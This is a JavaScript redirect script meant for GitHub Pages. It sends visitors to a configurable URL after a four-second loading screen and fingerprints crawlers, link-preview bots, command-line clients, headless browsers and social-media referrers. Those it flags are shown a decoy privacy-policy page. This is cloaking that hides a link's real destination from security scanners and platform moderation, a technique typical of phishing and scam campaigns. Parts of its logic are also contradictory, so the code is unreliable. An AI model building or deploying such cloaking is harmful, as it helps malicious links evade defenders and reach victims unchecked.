// Advanced Redirect Script with Bot Detection and 4-Second Delay
// Compatible with GitHub Pages

(function() {
    'use strict';
    
    // Configuration
    const REDIRECT_URL = 'https://example.com'; // Change this to your target URL
    const DELAY_SECONDS = 4;
    const LOADING_MESSAGE = 'Loading...';
    
    // Bot detection patterns
    const BOT_USER_AGENTS = [
        /bot/i, /spider/i, /crawler/i, /scraper/i, /facebookexternalhit/i,
        /twitterbot/i, /linkedinbot/i, /whatsapp/i, /telegram/i,
        /googlebot/i, /bingbot/i, /slurp/i, /duckduckbot/i,
        /baiduspider/i, /yandexbot/i, /applebot/i, /petalbot/i,
        /curl/i, /wget/i, /python/i, /java/i, /php/i, /ruby/i,
        /go-http-client/i, /http/i, /okhttp/i, /apache-httpclient/i,
        /headlesschrome/i, /phantomjs/i, /selenium/i, /webdriver/i,
        /puppeteer/i, /playwright/i, /chrome-lighthouse/i,
        /postman/i, /insomnia/i, /rest-client/i, /api/i
    ];
    
    // Additional bot detection methods
    function detectBot() {
        const userAgent = navigator.userAgent;
        
        // Check user agent patterns
        for (let pattern of BOT_USER_AGENTS) {
            if (pattern.test(userAgent)) {
                return true;
            }
        }
        
        // Check for headless browser indicators
        if (navigator.webdriver === true) return true;
        if (window.navigator.plugins.length === 0) return true;
        if (!window.chrome && navigator.userAgent.includes('Chrome')) return true;
        
        // Check for automation indicators
        if (window.callPhantom || window._phantom || window.phantom) return true;
        if (window.Buffer) return true;
        if (window.emit) return true;
        if (window.spawn) return true;
        
        // Check screen dimensions (typical bot values)
        if (screen.width === 0 || screen.height === 0) return true;
        if (screen.width === 1024 && screen.height === 768) return true;
        
        // Check for missing properties that real browsers have
        if (!navigator.languages || navigator.languages.length === 0) return true;
        if (!navigator.platform) return true;
        
        return false;
    }
    
    // Check if accessing from suspicious referrer
    function checkReferrer() {
        const suspiciousReferrers = [
            'facebook.com', 'twitter.com', 'linkedin.com', 't.co',
            'instagram.com', 'whatsapp.com', 'telegram.org'
        ];
        
        const referrer = document.referrer.toLowerCase();
        return suspiciousReferrers.some(domain => referrer.includes(domain));
    }
    
    // Create loading interface
    function createLoadingInterface() {
        // Clear existing content
        document.body.innerHTML = '';
        
        // Apply styles
        document.body.style.cssText = `
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: center;
        `;
        
        // Create container
        const container = document.createElement('div');
        container.style.cssText = `
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
            max-width: 400px;
            width: 90%;
        `;
        
        // Create spinner
        const spinner = document.createElement('div');
        spinner.style.cssText = `
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        `;
        
        // Add spin animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        `;
        document.head.appendChild(style);
        
        // Create message
        const message = document.createElement('h2');
        message.textContent = LOADING_MESSAGE;
        message.style.cssText = `
            margin: 0 0 20px;
            font-size: 24px;
            font-weight: 300;
        `;
        
        // Create countdown
        const countdown = document.createElement('div');
        countdown.id = 'countdown';
        countdown.style.cssText = `
            font-size: 18px;
            opacity: 0.8;
        `;
        
        container.appendChild(spinner);
        container.appendChild(message);
        container.appendChild(countdown);
        document.body.appendChild(container);
        
        return countdown;
    }
    
    // Start countdown and redirect
    function startRedirect() {
        const countdownEl = createLoadingInterface();
        let timeLeft = DELAY_SECONDS;
        
        const updateCountdown = () => {
            countdownEl.textContent = `Redirecting in ${timeLeft} seconds...`;
            
            if (timeLeft <= 0) {
                countdownEl.textContent = 'Redirecting now...';
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 500);
                return;
            }
            
            timeLeft--;
            setTimeout(updateCountdown, 1000);
        };
        
        updateCountdown();
    }
    
    // Block bots with fake content
    function blockBot() {
        document.body.innerHTML = '';
        document.body.style.cssText = `
            margin: 20px;
            font-family: Arial, sans-serif;
            background: white;
            color: black;
        `;
        
        const content = document.createElement('div');
        content.innerHTML = `
            <h1>Privacy Policy</h1>
            <p>This website respects your privacy and is committed to protecting your personal information.</p>
            <h2>Information We Collect</h2>
            <p>We may collect various types of information when you visit our website...</p>
            <h2>How We Use Information</h2>
            <p>We use the information we collect to provide and improve our services...</p>
            <h2>Contact Us</h2>
            <p>If you have questions about this Privacy Policy, please contact us at privacy@example.com</p>
        `;
        document.body.appendChild(content);
        
        // Prevent any redirects
        window.location.href = '#';
        return false;
    }
    
    // Main execution
    function main() {
        // Wait for DOM to be ready
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', main);
            return;
        }
        
        // Detect bots and block them
        if (detectBot() || checkReferrer()) {
            blockBot();
            return;
        }
        
        // Check if this is a real user interaction
        let hasInteracted = false;
        const interactionEvents = ['click', 'keydown', 'touchstart', 'mousemove'];
        
        interactionEvents.forEach(event => {
            document.addEventListener(event, () => {
                hasInteracted = true;
            }, { once: true });
        });
        
        // Small delay to allow for interaction detection
        setTimeout(() => {
            if (!hasInteracted) {
                // Likely a bot - show fake content
                blockBot();
            } else {
                // Real user - proceed with redirect
                startRedirect();
            }
        }, 100);
        
        // Fallback: if no interaction after 2 seconds, assume real user
        setTimeout(() => {
            if (!hasInteracted) {
                startRedirect();
            }
        }, 2000);
    }
    
    // Handle different loading scenarios
    if (typeof window !== 'undefined') {
        main();
    }
    
    // Prevent common bot access methods
    Object.defineProperty(window, 'callPhantom', {
        get: () => blockBot
    });
    
    Object.defineProperty(window, '_phantom', {
        get: () => blockBot
    });
    
})();
